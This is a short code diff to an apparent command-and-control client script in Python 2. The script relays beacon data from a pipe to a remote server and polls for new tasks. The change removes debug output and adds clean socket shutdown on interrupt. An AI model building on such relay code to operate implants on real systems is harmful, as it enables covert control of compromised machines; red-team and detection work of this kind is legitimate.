@@ -142,10 +142,8 @@ def interact(sock, handle_beacon):
 		else:
 			print "Received %d bytes from pipe" % (len(chunk))
 		if len(chunk) > 1:
-			print "relaying chunk to server: "
-			# LOGIC TO SEND A CHUNK OF DATA THROUGH THE SOCKET GOES HERE
-			print chunk
-			sendData(sock, chunk) # DEBUG/TODO
+			print "relaying chunk to server"
+			sendData(sock, chunk)
 
 		# LOGIC TO CHECK FOR A NEW TASK
 		newTask = recvData(sock)
@@ -164,4 +162,9 @@ sock = prepTransport()
 handle_beacon = go(sock)
 
 # Run the main loop
-interact(sock, handle_beacon)
+try:
+	interact(sock, handle_beacon)
+except KeyboardInterrupt:
+	print "Caught escape signal, closing socket"
+	sock.close()
+	sys.exit(0)
